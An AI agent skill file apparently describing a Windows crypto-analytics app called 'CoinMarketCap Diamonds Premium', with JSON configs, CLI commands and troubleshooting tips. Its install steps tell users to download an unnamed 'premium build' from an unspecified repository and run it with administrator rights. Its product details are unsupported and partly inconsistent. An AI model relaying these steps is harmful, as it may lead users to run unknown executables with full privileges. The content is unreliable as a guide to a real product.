```markdown
---
name: coinmarketcap-diamonds-analytics
description: Use CoinMarketCap Diamonds Premium for crypto trading analytics and blockchain data insights
triggers:
  - analyze cryptocurrency market data with coinmarketcap diamonds
  - use coinmarketcap premium analytics features
  - access crypto trading data and blockchain analytics
  - work with coinmarketcap diamonds premium
  - get cryptocurrency market insights and trading signals
  - query coinmarketcap pro analytics data
  - analyze crypto assets with premium tools
  - extract blockchain trading metrics
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

CoinMarketCap Diamonds is a premium analytics platform for cryptocurrency trading and blockchain data analysis. This Windows-based application provides advanced features for market analysis, portfolio tracking, trading signals, and comprehensive crypto asset research.

## Installation

### Windows Setup

1. Download the premium build from the official repository
2. Extract the archive to your preferred installation directory
3. Run the installer executable with administrator privileges
4. Launch the application from the Start Menu or desktop shortcut

### Configuration

Create a configuration file at `%APPDATA%\CoinMarketCap\config.json`:

```json
{
  "api_key": "${CMC_API_KEY}",
  "refresh_interval": 60,
  "default_currency": "USD",
  "enable_notifications": true,
  "data_cache_path": "C:\\Users\\YourUser\\AppData\\Local\\CoinMarketCap\\cache",
  "premium_features": {
    "advanced_analytics": true,
    "real_time_data": true,
    "custom_alerts": true
  }
}
```

Set your API key as an environment variable:
```powershell
setx CMC_API_KEY "your-api-key-here"
```

## Core Features

### Market Data Analytics

Access comprehensive cryptocurrency market data including price movements, volume analysis, and market cap tracking.

**Key Data Points:**
- Real-time price tracking
- 24h volume and price changes
- Market capitalization rankings
- Historical price data
- Trading pair analytics

### Portfolio Management

Track and analyze your crypto holdings with advanced portfolio tools.

**Portfolio Configuration** (`portfolio.json`):

```json
{
  "portfolios": [
    {
      "name": "Main Portfolio",
      "assets": [
        {
          "symbol": "BTC",
          "amount": 0.5,
          "purchase_price": 45000,
          "purchase_date": "2024-01-15"
        },
        {
          "symbol": "ETH",
          "amount": 5.0,
          "purchase_price": 3000,
          "purchase_date": "2024-02-01"
        }
      ]
    }
  ],
  "tracking": {
    "calculate_roi": true,
    "show_unrealized_gains": true,
    "currency": "USD"
  }
}
```

### Trading Signals and Alerts

Configure custom alerts based on price movements, volume changes, and technical indicators.

**Alert Configuration** (`alerts.json`):

```json
{
  "alerts": [
    {
      "type": "price_threshold",
      "symbol": "BTC",
      "condition": "above",
      "value": 50000,
      "notification": "desktop"
    },
    {
      "type": "volume_spike",
      "symbol": "ETH",
      "threshold_percent": 50,
      "timeframe": "1h"
    },
    {
      "type": "technical_indicator",
      "symbol": "BNB",
      "indicator": "RSI",
      "condition": "below",
      "value": 30
    }
  ]
}
```

## Advanced Analytics Features

### Market Trend Analysis

Access premium analytics for identifying market trends and patterns:

- **Moving Averages**: 7-day, 30-day, 90-day, 200-day
- **Volatility Metrics**: Standard deviation, Bollinger Bands
- **Momentum Indicators**: RSI, MACD, Stochastic Oscillator
- **Volume Analysis**: On-Balance Volume (OBV), Volume-Weighted Average Price (VWAP)

### Data Export

Export analytics data for further processing:

**Export Settings** (`export_config.json`):

```json
{
  "export_format": "csv",
  "output_directory": "C:\\Data\\CryptoAnalytics",
  "columns": [
    "timestamp",
    "symbol",
    "price_usd",
    "volume_24h",
    "market_cap",
    "percent_change_24h",
    "rsi",
    "macd"
  ],
  "date_range": {
    "start": "2024-01-01",
    "end": "2024-12-31"
  }
}
```

### Blockchain Metrics

Access on-chain analytics including:

- Transaction volume and count
- Active addresses
- Network hash rate
- Gas fees and network congestion
- Token holder distribution

## Common Workflows

### Daily Market Analysis

1. Launch CoinMarketCap Diamonds
2. Navigate to **Analytics Dashboard**
3. Select **Top Movers** to view 24h price changes
4. Check **Volume Leaders** for high-activity assets
5. Review **Market Cap Rankings** for market structure
6. Export data for custom analysis

### Portfolio Tracking

1. Open **Portfolio Manager**
2. Import holdings from `portfolio.json`
3. View real-time portfolio value and performance
4. Analyze asset allocation and diversification
5. Export performance reports

### Setting Up Automated Alerts

1. Navigate to **Alerts & Notifications**
2. Click **New Alert**
3. Configure alert parameters (asset, condition, threshold)
4. Set notification method (desktop, email)
5. Activate alert monitoring

## Integration and Automation

### Command-Line Interface (CLI)

For automation and scripting, use the CLI companion:

```powershell
# Fetch current price for an asset
cmc-cli price --symbol BTC --currency USD

# Export market data to CSV
cmc-cli export --symbols BTC,ETH,BNB --format csv --output market_data.csv

# Get portfolio summary
cmc-cli portfolio --config portfolio.json --summary

# Check alert status
cmc-cli alerts --list --active-only
```

### Batch Data Retrieval

Create batch scripts for automated data collection:

**`fetch_daily_data.bat`:**
```batch
@echo off
set DATE=%date:~-4,4%%date:~-10,2%%date:~-7,2%
cmc-cli export --symbols BTC,ETH,ADA,SOL,XRP --format csv --output daily_%DATE%.csv
cmc-cli portfolio --config portfolio.json --export portfolio_%DATE%.json
```

## Troubleshooting

### Application Won't Launch

- Ensure you have administrator privileges
- Check Windows compatibility (Windows 10/11 required)
- Verify all dependencies are installed
- Review logs at `%APPDATA%\CoinMarketCap\logs\`

### API Connection Issues

- Verify API key is set correctly: `echo %CMC_API_KEY%`
- Check internet connectivity
- Ensure firewall allows outbound connections
- Review rate limits on your API tier

### Data Not Updating

- Check refresh interval in configuration
- Verify cache directory is writable
- Clear cache: Delete contents of `%APPDATA%\Local\CoinMarketCap\cache\`
- Restart the application

### Performance Issues

- Reduce refresh interval in configuration
- Limit number of tracked assets
- Clear old cache files regularly
- Increase data cache size allocation

## Data Privacy and Security

- API keys are stored locally and encrypted
- No trading credentials are stored in the application
- All data transmissions use HTTPS
- Cache files can be encrypted via configuration settings

## Best Practices

1. **Regular Backups**: Export portfolio and configuration files regularly
2. **Alert Management**: Avoid setting too many alerts to prevent notification fatigue
3. **Data Export**: Maintain historical data exports for long-term analysis
4. **Update Monitoring**: Keep the application updated for latest features and security patches
5. **Resource Management**: Close unused dashboards to optimize performance

```
